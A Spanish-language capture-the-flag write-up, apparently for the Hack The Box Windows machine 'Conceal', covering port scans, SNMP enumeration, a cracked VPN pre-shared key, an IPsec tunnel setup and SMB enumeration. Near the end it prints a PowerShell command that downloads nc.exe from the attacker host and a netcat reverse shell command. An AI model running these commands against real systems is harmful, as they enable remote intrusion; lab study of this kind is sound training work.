---
layout: post
author: Sergio Salgado
---

|     Iformation         |      Link          |
|:-----------------------|:-------------------|
| Name                   | Conceal            |
| Os                     | Windows            |
| Difficulty             | Hard               |
| Points                 | 0                  |
| IP                     | 10.10.10.116       |

## [](#header-2)Reconocimiento

Primero utilizaremos la herramienta que hace la identificación de conexión silenciosa y reconocimiento del sistema al que nos presentamos.

### [](#header-3)NMAP   

Podemos atacar buscando por protocolos TCP, UDP o SCTP. Sobre este orden es recomendado por que va de acuerdo a la probabilidad de presentarse con uno similar.

El primer escaneo rápido sera sobre TCP con nmap, para poder agilizar mientras más búsquedas o búsqueda de vulnerabilidades sobre esos puertos. El primer comando que intentaremos usar es:

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.116
```

Por TCP no fue posible encontrar ningun puerto abierto, intentaremos hacerlo ahora por UDP de la manera siguiente:

```s
sudo nmap -sU -p- --open --min-rate 10000 -vvv -n -Pn 10.10.11.116 -oG allUDPPorts
```

Para filtrar su contenido basta con agregar:

```s
cat allUDPPorts | grep -oP '\d{1,5}/open/udp'
```

El siguiente escaneo sera de la manera siguiente:

```s
sudo nmap -sCVU -p500 10.10.10.116 -oN udpScan
```

La respuesta al escaneo anterior nos indica que el puerto 161 y 500 estan abiertos, lo que significa que SNMP esta en servicio por el 161 y por el 500 tratare de detectar el servicio y version.

Empezaremos la enumeracion de informacion ahora por SNMP que de acuerdo a hacktrics podemos usar el comando

```s
onesixtyone 10.10.10.116
```

Tenemos ahora el community string que es public, tambien podemos validar mediante wordlist de SecList.

Ahora por snmp podemos intentar enumerar con snmpwalk

![onesixtyone](/assets/images/Conceal/onesixtyone.png)

Para enumerar mas servicios de SNMP con nmap podemos buscar los scripts con

```s
locate .nse | grep snmp
```

Escogemos algun script y lo usamos con

```s
sudo nmap --script snmp-netstat -p161 -sU 10.10.10.116
sudo nmap --script snmp-processes -p161 -sU 10.10.10.116
```

Recordemos que SNMP suele mostrar cosas privilegiadas o hasta contrasenas de procesos que estan corriendo.

```s
snmpwalk -v2c -c public 10.10.10.116 
```
En la cabecera de la respuesta de este comando pudimos ver una contrasena que intentaremos crackear sencillamente en la pagina <a href="https://crackstation.net/">crackstation </a>

Una vez que contamos con la contrasena de la VPN, intentaremos usarla primero instalando strongswan y centraremos la atencion a nuestros archivos de configuracion para ipsec en /etc/ipsec.secrets y /etc/ipsec.conf que son los archivos de configuracion que nos crea strongswan. Ahora viendo como funciona este tipo de conexiones tendremos que abrir el archivo secrets y poner la siguiente linea

```s
%any : PSK "Dudecake1!"
```

Ahora continuaremos la enumeracion con ike-scan de la manera siguiente:

```s
ike-scan 10.10.10.116 -M
```

La salida la almacenaremos ya que nos sera util para poder conectarnos, modificaremos entonces el archivo /etc/ipsec.conf con las lineas siguientes

```s
conn conceal
  keyexchange=ikev1
  type=transport
  left=10.10.14.12
  right=10.10.10.116
  auto=add #ondemand start ignore
  authby=secret
  ike=3des-sha1-modp1024
  esp=3des-sha1
  rightsubnet=10.10.10.116[tcp]
```

Ahora para intentar conectarnos guardamos la configuracion y damos un 

```s
ipsec restart
ipsec up conceal 
```

En esta parte tuve errores, pero lo solucione instalando libstrongswan-extra-plugins.

Ahora podemos hacer un escaneo a travez de la conexion que tenemos con

```s
sudo nmap -sCVT -p21,80,135,139,445,49664,49665,49670 10.10.10.116 -oN targeted
```

![nmap4](/assets/images/Conceal/nmap4.png)

Como tenemos el puerto 445 abierto, lo siguiente que podemos enumerarlo con

```s
crackmapexec smb 10.10.10.116
```

![crackmapexec](/assets/images/Conceal/crackmapexec.png)

Ahora veremos si tenemos ejecusion con powershell

powershell invoke-WebRequest -UseBasicParsing 10.10.14.12/nc.exe -OutFile C:\nc.exe

C:\nc.exe 10.10.14.12 4444 -e cmd

Ahora para enumerar mas vulnerabilidades lo que haremos es usar la herramienta<a href="https://github.com/rasta-mouse/Watson.git">watson </a>

Tambien hay otra herramienta llamada juicypotattoe

